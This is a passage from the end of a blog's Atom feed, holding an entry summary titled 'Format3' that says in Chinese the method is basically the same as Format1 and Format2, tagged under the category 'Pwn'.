class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Format3&quot;&gt;&lt;a href=&quot;#Format3&quot; class=&quot;headerlink&quot; title=&quot;Format3&quot;&gt;&lt;/a&gt;Format3&lt;/h1&gt;&lt;p&gt;与Format1、Format2做法基本相同&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
</feed>
